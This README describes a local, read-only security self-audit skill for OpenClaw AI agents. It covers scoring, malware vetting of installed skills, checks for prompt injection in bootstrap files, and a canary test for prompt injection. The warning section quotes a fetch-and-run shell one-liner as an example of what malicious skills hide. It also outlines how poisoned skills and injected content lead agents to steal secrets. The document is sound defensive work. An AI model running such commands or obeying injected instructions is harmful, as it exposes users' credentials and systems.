# ClawCheck 🔍 — OpenClaw Security Self-Audit Skill

**Free. Local. Read-only. No API key. Your data never leaves your machine.**

A one-command security self-audit for *your own* OpenClaw agent. It scores your setup
**A–F**, surfaces the most urgent holes in plain language, and gives copy-paste fixes —
plus a **shareable grade badge**.

Because you run it on your own agent, there's no "scanning someone else" problem: no
proof-of-ownership, no legal grey area.

## ⚠️ Important — trust no one (including this skill)

OpenClaw skills are **not sandboxed**: an installed skill runs with your agent's full
permissions. The ClawHavoc campaign poisoned ClawHub with **hundreds of malicious skills**
that steal credentials and crypto wallets — a single line of markdown can hide a
`curl http://<ip> | bash`.

So, before you download, install, or use **any** skill (this one included):

1. **Read the source** — it's plain text. If you can't see what it does, don't run it.
2. **Have your agent analyse it for you** — ask OpenClaw to review the skill's `SKILL.md`
   and scripts for shell-exec, credential access, paste-host uploads, and obfuscated
   (base64) payloads *before* enabling it.
3. **Pin a known release**, prefer signed / VirusTotal-clean skills, and rotate any secret a
   skill could have reached if you ever suspect it.

ClawCheck practises this: it is open source, zero-dependency, read-only, and its **B13** check
does exactly this vetting on the skills you've *already* installed. Trust is earned by being
readable — so read it.

## Why another audit tool?

The built-in `openclaw security audit` and tools like Trent/ClawSec are good — but:

- The native audit **does not inspect the content of your bootstrap files**
  (`SOUL.md`, `AGENTS.md`, `TOOLS.md`): they're injected into the system prompt as *trusted
  context* with no validation. ClawCheck **does** check them for prompt-injection-prone
  directives (our check **B6**).
- ClawCheck is **100% local** — no API key, nothing transmitted (Trent uploads your config;
  the native one is CLI-only).
- It leads with a **shareable Score + Grade + Lethal Trifecta ratio** you can post to the
  community — without ever exposing your actual findings.

## What it checks

- **Lethal Trifecta** (untrusted input × sensitive data × outbound actions — keep ≤2 of 3)
- Gateway exposure & channel auth, plaintext secrets, least privilege, execution sandbox,
  plugin/skill supply-chain integrity, bootstrap-file injection surface, memory poisoning,
  human approval, secret-leak/redaction, TLS, local-first/model hygiene.
- **B13 — installed-skill / plugin vetting:** scans the *content* of skills you downloaded
  (not made yourself) for the ClawHavoc malware class, including base64-hidden payloads.
- **B14 — egress surface:** where the agent can reach out (channels, external skills, tools).
- **B15 — MCP server trust** boundaries.
- **B16 — threat monitoring:** whether you actually have monitoring/detection set up at all.
- Plus your platform's own **`openclaw security audit`**, run for you and merged in.

## Built-in audit, included for you

Non-technical users will never open a terminal to run OpenClaw's own
`openclaw security audit`. So ClawCheck runs it **for you** (read-only) and folds its
findings into the same plain-language report — one button shows both ClawCheck's checks
*and* the platform's own audit. Native findings are shown but are **not** mixed into the
ClawCheck score (kept deterministic). Disable with `--no-native`.

## Trust / provenance

ClawCheck is **open source and zero-dependency (Python stdlib only)**. Its own checks are
**read-only and offline** — they read only `~/.openclaw/openclaw.json` and your workspace
bootstrap markdown files, and make **no network calls**. It writes nothing by default; the only
writes are ones you ask for — a report file (`--save`) and the `--monitor` snapshot at
`~/.clawcheck/state.json`. It never touches your OpenClaw config or data.

The **only** external command it can run is your own, fixed and read-only:

```
openclaw security audit --json
```

No shell, never `--fix`, with a timeout; skip it entirely with `--no-native`. The entire
source is in [`clawcheck/`](clawcheck/) — read it before you trust it. Amid the ClawHavoc
malicious-skill wave, an audit skill should prove its own safety; this one does.

## Install & run

```bash
openclaw skills install git:<owner>/clawcheck   # from GitHub (pin a release tag)
openclaw skills install clawcheck                # from ClawHub (once published)
# then ask your agent: "audit my OpenClaw setup with clawcheck"
```

Or run directly (Linux/macOS):

```bash
python3 audit.py                 # human report + shareable card
python3 audit.py --json          # machine-readable
python3 audit.py --card          # just the badge
python3 audit.py --ascii         # plain output (no unicode icons/box)
python3 audit.py --home ~/.openclaw
```

On **Windows** use `python` (or `py`); the script auto-detects consoles that can't render
unicode and falls back to ASCII, or force it with `--ascii`:

```bat
python audit.py
py audit.py --card --ascii
```

Cross-platform: pure Python stdlib, pathlib-based paths, POSIX file-permission checks are
skipped on Windows (NTFS uses ACLs), and all output has an ASCII fallback.

## How you get the report

When you run the skill inside OpenClaw, the agent executes `audit.py`, captures its output,
and shows it to you **right there in the chat** — no terminal, no setup. You see:

1. your **Score / Grade / Lethal Trifecta** ratio,
2. the **fix list, most urgent first**, in plain language, and
3. a **shareable badge** (grade only — safe to post; the findings stay private).

To keep a copy, add `--save report.txt` and ClawCheck writes the full report to that file
(the only thing it ever writes). For automation, `--json` gives a machine-readable result.

## Threat monitoring

Two complementary things:

**B16 — do you have monitoring at all?** ClawCheck checks whether you have threat
monitoring/detection set up — an agent with none won't alert you if it's compromised. B16 looks
for a monitoring skill/plugin (ClawSec, `openclaw-security-monitor`, …) or monitoring/alerts
config; if none is found it warns you and tells you how to add one.

**`--monitor` — built-in lightweight monitoring.** One way to *get* monitoring: re-audit on a
schedule and alert on what **changed** — a new or modified installed skill, `SOUL.md` drift, a
dropped score, a check going PASS → FAIL.

```bash
python3 audit.py --monitor                 # first run = baseline, then alerts on changes
python3 audit.py --monitor --state ~/.clawcheck/state.json
```

Schedule it via OpenClaw's heartbeat or cron; when an alert fires, have your agent message you.
It stores one small snapshot at `~/.clawcheck/state.json`. (Scheduled re-audit + drift
detection — not a real-time runtime IDS; that heavier model is intentionally out of scope.)

## More tools

```bash
python3 audit.py --vet ./some-skill        # vet a skill (dir or SKILL.md) BEFORE installing it
python3 audit.py --canary                   # active prompt-injection self-test (battle-tested)
python3 audit.py --badge badge.svg          # write a shareable SVG grade badge
python3 audit.py --prompts                   # a copy-paste "ask your agent to fix it" per finding
```

- **`--vet PATH`** runs the B13 malware scan on a skill *before* you install it (point it at a
  downloaded folder or `SKILL.md`; for a URL, clone it first, then vet the local copy). Verdict:
  SAFE / SUSPICIOUS / DANGEROUS.
- **`--canary`** emits a benign injection hidden in untrusted-looking content; feed it to your
  agent — if the agent echoes the token, it obeyed an injection (**VULNERABLE**), otherwise
  **RESISTANT**. This is the live "battle-tested" complement to the passive checks.
- **`--badge PATH`** writes a shields-style SVG (grade + score only) for your README / posts.
- **`--prompts`** turns every finding into a ready prompt you paste into your agent to fix it.

## Scoring

Weighted pass-rate (CRITICAL=10, HIGH=6, MEDIUM=3, LOW=1). **Honesty hard-caps:** any open
CRITICAL caps the score at 49, any open HIGH at 79 — you can never show an "A" with a critical
hole. Grades: A 90+ · B 80–89 · C 70–79 · D 50–69 · F <50. The shareable card shows **only the
grade + score + trifecta ratio — never the findings** (sharing must not hand attackers your map).

## Status

Prototype (v0.3). Passive, read-only checks, installed-skill malware vetting, and the built-in
`openclaw security audit` merged in. Active live red-teaming (battle-tested score), history/trend,
and percentile ("safer than X% of agents") are on the roadmap.

## Tests

```bash
python3 -m pytest -q
```

## License

MIT — see [LICENSE](LICENSE).
